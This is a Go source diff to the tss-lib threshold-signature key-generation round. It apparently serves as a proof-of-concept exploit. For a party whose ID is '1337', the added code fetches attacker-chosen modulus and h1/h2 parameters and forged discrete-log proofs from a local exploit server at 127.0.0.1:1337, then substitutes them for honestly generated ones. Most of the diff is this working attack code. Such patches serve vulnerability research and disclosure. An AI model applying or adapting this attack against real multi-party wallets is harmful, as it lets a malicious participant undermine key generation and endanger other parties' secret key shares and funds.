@@ -7,8 +7,12 @@
 package keygen
 
 import (
+	"encoding/json"
 	"errors"
+	"fmt"
+	"log"
 	"math/big"
+	"net/http"
 
 	"github.com/bnb-chain/tss-lib/common"
 	"github.com/bnb-chain/tss-lib/crypto"
@@ -26,6 +30,26 @@ var (
 func newRound1(params *tss.Parameters, save *LocalPartySaveData, temp *localTempData, out chan<- tss.Message, end chan<- LocalPartySaveData) tss.Round {
 	return &round1{
 		&base{params, save, temp, out, end, make([]bool, len(params.Parties().IDs())), false, 1}}
+}
+
+type Params struct {
+	N                 *big.Int        `json:"N"`
+	H1                *big.Int        `json:"h1"`
+	H2                *big.Int        `json:"h2"`
+	ProofDlogH2BaseH1 *dlnproof.Proof `json:"proof_dlog_h2_base_h1"`
+	ProofDlogH1BaseH2 *dlnproof.Proof `json:"proof_dlog_h1_base_h2"`
+}
+
+func genMaliciousParams(exploitBaseURL string) *Params {
+	resp, err := http.Get(exploitBaseURL + "/gen-params")
+	if err != nil {
+		log.Fatal(err)
+	}
+	var obj Params
+	if err := json.NewDecoder(resp.Body).Decode(&obj); err != nil {
+		log.Fatal(err)
+	}
+	return &obj
 }
 
 func (round *round1) Start() *tss.Error {
@@ -79,21 +103,32 @@ func (round *round1) Start() *tss.Error {
 			return round.WrapError(errors.New("pre-params generation failed"), Pi)
 		}
 	}
+	var dlnProof1, dlnProof2 *dlnproof.Proof
+	if round.PartyID().Id == "1337" {
+		// load malicious params
+		fmt.Printf("Generating malicious params for party: %s...\n", round.PartyID().Moniker)
+		params := genMaliciousParams("http://127.0.0.1:1337")
+		preParams.NTildei = params.N
+		preParams.H1i = params.H1
+		preParams.H2i = params.H2
+		dlnProof1 = params.ProofDlogH2BaseH1
+		dlnProof2 = params.ProofDlogH1BaseH2
+	} else {
+		// generate the dlnproofs for keygen
+		h1i, h2i, alpha, beta, p, q, NTildei :=
+			preParams.H1i,
+			preParams.H2i,
+			preParams.Alpha,
+			preParams.Beta,
+			preParams.P,
+			preParams.Q,
+			preParams.NTildei
+		dlnProof1 = dlnproof.NewDLNProof(h1i, h2i, alpha, p, q, NTildei)
+		dlnProof2 = dlnproof.NewDLNProof(h2i, h1i, beta, p, q, NTildei)
+	}
 	round.save.LocalPreParams = *preParams
 	round.save.NTildej[i] = preParams.NTildei
 	round.save.H1j[i], round.save.H2j[i] = preParams.H1i, preParams.H2i
-
-	// generate the dlnproofs for keygen
-	h1i, h2i, alpha, beta, p, q, NTildei :=
-		preParams.H1i,
-		preParams.H2i,
-		preParams.Alpha,
-		preParams.Beta,
-		preParams.P,
-		preParams.Q,
-		preParams.NTildei
-	dlnProof1 := dlnproof.NewDLNProof(h1i, h2i, alpha, p, q, NTildei)
-	dlnProof2 := dlnproof.NewDLNProof(h2i, h1i, beta, p, q, NTildei)
 
 	// for this P: SAVE
 	// - shareID
